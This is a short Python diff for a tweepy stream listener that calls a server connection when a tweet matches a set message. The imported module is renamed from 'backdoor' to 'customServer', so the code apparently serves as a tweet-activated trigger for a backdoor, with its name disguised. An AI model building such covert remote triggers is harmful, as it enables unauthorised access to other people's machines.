@@ -3,7 +3,7 @@ import tweepy
 from tweepy import StreamListener
 from tweepy import Stream
 from configparser import ConfigParser
-from backdoor import Server
+from customServer import Server
 
 #Twitter
 """
@@ -34,14 +34,12 @@ class CustomStreamListener(tweepy.StreamListener):
 		try:
 			twitter_message = str(status.extended_tweet["full_text"])
 			if twitter_message == self.message:
-				socket = self.server.getSocket()
-				self.server.login(socket)
+				self.server.connection()
 
 		except AttributeError:
 			twitter_message = str(status.text)
 			if twitter_message == self.message:
-				socket = self.server.getSocket()
-				self.server.login(socket)
+				self.server.connection()
 
 	def on_error(self, status_code):
 		if status_code == 420:
